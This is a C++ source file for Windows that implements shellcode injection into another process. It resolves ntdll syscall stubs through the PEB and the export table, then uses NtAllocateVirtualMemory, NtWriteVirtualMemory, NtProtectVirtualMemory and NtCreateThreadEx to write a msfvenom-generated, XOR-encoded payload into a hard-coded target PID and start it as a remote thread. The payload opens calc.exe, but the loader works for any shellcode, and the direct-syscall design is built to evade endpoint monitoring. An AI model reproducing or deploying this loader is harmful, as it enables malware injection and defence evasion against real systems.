#include <iostream>
#include <Windows.h>

#include "structs.h"

#define STATUS_SUCCESS 0

int const SYSCALL_STUB_SIZE = 23;


//msfvenom - a x64 --platform windows - p windows / x64 / exec cmd = calc.exe EXITFUNC = thread - f c -e x64/xor -i 2
unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xd8\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xf7\xa3\x33\x78\x5e\x4f\xc0\x65\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbf\x92\xfa\x30\xdf\xa6"
"\x1d\x9a\x08\x5c\x7b\xf5\x5b\xa0\x3f\x9a\x08\xeb\x88\xfa\x9a"
"\x00\x8d\xcf\xfa\x68\x10\x30\x6f\x17\xe7\x2d\xda\x5b\xcc\x87"
"\xa1\xad\x34\x1b\x7b\x6f\x9a\x22\xbb\x44\xe3\xe7\x33\xad\x2f"
"\x93\x03\xd6\xb2\xb1\x7b\xdd\xac\xb7\x1b\x0f\xb1\x87\x7b\x67"
"\x2c\xca\x1b\x0f\xb1\xc7\x7b\x67\x0c\x82\x1b\x8b\x54\xad\x79"
"\xa1\x4f\x1b\x1b\xb5\x23\x4b\x0f\x8d\x02\xd0\x7f\xa4\xa2\x26"
"\xfa\xe1\x3f\xd3\x92\x66\x0e\xb5\x72\xbd\x36\x59\x01\xa4\x68"
"\xa5\x0f\xa4\x7f\x02\xd8\x04\x6b\xe7\x33\xec\x36\x57\x93\xf0"
"\x84\xaf\x32\x3c\x2e\x59\x1b\x9c\xa7\x6c\x73\xcc\x37\xd3\x83"
"\x67\xb5\xaf\xcc\x25\x3f\x59\x67\x0c\xab\xe6\xe5\xa1\x4f\x1b"
"\x1b\xb5\x23\x4b\x72\x2d\xb7\xdf\x12\x85\x22\xdf\xd3\x99\x8f"
"\x9e\x50\xc8\xc7\xef\x76\xd5\xaf\xa7\x8b\xdc\xa7\x6c\x73\xc8"
"\x37\xd3\x83\xe2\xa2\x6c\x3f\xa4\x3a\x59\x13\x98\xaa\xe6\xe3"
"\xad\xf5\xd6\xdb\xcc\xe2\x37\x72\xb4\x3f\x8a\x0d\xdd\xb9\xa6"
"\x6b\xad\x27\x93\x09\xcc\x60\x0b\x13\xad\x2c\x2d\xb3\xdc\xa2"
"\xbe\x69\xa4\xf5\xc0\xba\xd3\x1c\x18\xcc\xb1\x36\x68\x52\x84"
"\xe3\xe7\x33\xec\x7e\xd2\x1b\x09\x6e\xe6\x32\xec\x7e\x93\xe9"
"\xb5\x68\x88\xb4\x13\xab\x69\xb3\x99\xc9\xed\x72\x56\xd8\x47"
"\xee\x19\x1c\x32\x7b\x6f\xba\xfa\x6f\x82\x9f\xed\xb3\x17\x9e"
"\xa7\x56\x3f\xa4\xf4\x41\x83\x14\xd2\x0a\xc5\x6a\x3d\xcc\x39"
"\x1d\xb3\x3f\xe7\xcd\x82\x4b\x89\x7e\xd2\x53\x84\xe3\x65";


MyNtOpenProcess _NtOpenProcess = NULL;
char OpenProcStub[SYSCALL_STUB_SIZE] = {};

MyNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
char AllocStub[SYSCALL_STUB_SIZE] = {};

MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
char WVMStub[SYSCALL_STUB_SIZE] = {};

MyNtProtectVirtualMemory _NtProtectVirtualMemory = NULL;
char ProtectStub[SYSCALL_STUB_SIZE] = {};

MyNtCreateThreadEx _NtCreateThreadEx = NULL;
char CreateThreadStub[SYSCALL_STUB_SIZE];

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetStub(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase, std::string Syscall, LPVOID stub)
{
	for (size_t i = 0; i < dwExports; i++)
	{
		PCHAR pczFunctionName = (PCHAR)((PBYTE)dllBase + pdwAddressOfNames[i]);
		PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];

		LPCSTR functionNameResolved = (LPCSTR)pczFunctionName;

		if (std::strcmp(functionNameResolved, Syscall.c_str()) == 0)
		{
			std::memcpy(stub, (LPVOID)pFunctionAddress, SYSCALL_STUB_SIZE);
			return TRUE;
		}
	}
	return FALSE;
}

BOOL FindAllocateVirtualMemory(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
	BOOL status = VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtAllocateVirtualMemory", AllocStub))
		return FALSE;

	return TRUE;
}

BOOL FindOpenProc(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtOpenProcess = (MyNtOpenProcess)(LPVOID)OpenProcStub;
	BOOL status = VirtualProtect(OpenProcStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtOpenProcess", OpenProcStub))
		return FALSE;

	return TRUE;
}

BOOL FindWriteVirtualMemory(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
	BOOL status = VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtWriteVirtualMemory", WVMStub))
		return FALSE;

	return TRUE;
}

BOOL FindProtectVirtualMemory(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtProtectVirtualMemory = (MyNtProtectVirtualMemory)(LPVOID)ProtectStub;
	BOOL status = VirtualProtect(ProtectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtProtectVirtualMemory", ProtectStub))
		return FALSE;

	return TRUE;
}

BOOL FindCreateThread(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtCreateThreadEx = (MyNtCreateThreadEx)(LPVOID)CreateThreadStub;
	BOOL status = VirtualProtect(CreateThreadStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtCreateThreadEx", CreateThreadStub))
		return FALSE;

	return TRUE;
}

HANDLE CallOpenProc(DWORD pid)
{
	// variables for NtOpenProcess
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES zoa;
	InitializeObjectAttributes(&zoa, NULL, NULL, NULL, NULL, NULL);
	CLIENT_ID targetPid = { 0 };
	targetPid.UniqueProcess = (void*)pid;
	NTSTATUS success = NULL;
	success = _NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &zoa, &targetPid);
	if (success != 0)
		return NULL;

	return hProcess;
}


BOOL EstablishSyscalls()
{

	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30); 	//x64 only

	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb)
		return 1;

	//*****
	LIST_ENTRY* pListEntry = pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = NULL;
	for (pListEntry; pListEntry != NULL; pListEntry = pListEntry->Flink)
	{
		pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10) ;
		auto name = pLdrDataEntry->BaseDllName;
		//Make sure it is ntdll
		if (_wcsnicmp(name.Buffer, L"ntdll.dll", 10) == 0)
		{
			printf("Found ntdll.dll!");
			break;
		}
	}



	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pLdrDataEntry->DllBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pLdrDataEntry->DllBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pLdrDataEntry->DllBase + pImageExportDirectory->AddressOfNameOrdinals);

	if (!FindOpenProc(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtOpenProcess");
		return FALSE;
	}
	if (!FindAllocateVirtualMemory(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtAllocateVirtualMemory");
		return FALSE;
	}
	if (!FindWriteVirtualMemory(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtWriteVirtualMemory");
		return FALSE;
	}
	if (!FindProtectVirtualMemory(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtProtectVirtualMemory");
		return FALSE;
	}
	if (!FindCreateThread(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtCreateThreadEx");
		return FALSE;
	}


	return TRUE;

}



int main(int argc, char* argv[])
{
	HANDLE hProc = INVALID_HANDLE_VALUE;
	HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
	LPVOID lpAllocationStart = nullptr;
	SIZE_T szAllocation = sizeof buf;
	DWORD oldProtect;

	/*
	if (argc < 2)
	{
		printf("Enter target PID");
		return 1;

	} */

	if (!EstablishSyscalls())
		return 1;

	//DWORD targetPid = std::atoi(argv[1]);
	DWORD targetPid = 13132;
	BOOL localNtDll = TRUE;



	printf("Opening target process with PID %d\n", targetPid);
	hProc = CallOpenProc(targetPid);
	if (hProc == INVALID_HANDLE_VALUE) {
		printf("Failed to open target process\n");
		return FALSE;
	}

	printf("Allocating %d bytes\n", szAllocation);
	NTSTATUS status = _NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, &szAllocation, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to allocate memory\n");
		return FALSE;
	}

	printf("Writing shellcode to 0x%p\n", lpAllocationStart);
	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)buf, sizeof buf, NULL);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to write to allocated memory\n");
		return FALSE;
	}

	printf("Changing memory permissions\n");
	status = _NtProtectVirtualMemory(hProc, &lpAllocationStart, &szAllocation, PAGE_EXECUTE_READ, &oldProtect);
	if (status != STATUS_SUCCESS)
	{
		printf("Unable to change memory permissions\n");
		return FALSE;
	}

	printf("Creating remote thread\n");
	status = _NtCreateThreadEx(&hRemoteThread, 0x1FFFFF, NULL, hProc,
		(LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);


	if (hRemoteThread)
		CloseHandle(hRemoteThread);
	if (hProc)
		CloseHandle(hProc);

	if (status != STATUS_SUCCESS)
	{
		printf("CreateRemoteThread failed\n");
		return FALSE;
	}


	printf("Success!");
	return 0;
}

